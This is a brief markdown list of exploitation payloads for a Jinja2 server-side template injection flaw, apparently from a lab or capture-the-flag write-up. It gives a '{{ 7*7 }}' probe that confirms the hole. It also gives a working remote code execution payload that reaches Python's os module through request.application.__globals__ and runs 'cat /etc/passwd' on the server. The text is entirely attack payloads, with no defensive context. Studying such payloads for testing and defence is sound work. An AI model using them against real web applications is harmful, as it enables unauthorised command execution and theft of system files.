# Exploitation Payloads

## 1. Vulnerability Discovery
Used to confirm the Jinja2 SSTI vulnerability:
`{{ 7*7 }}`

## 2. Remote Code Execution (RCE)
Used to execute system commands and read the target file (`/etc/passwd`):
`{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}`
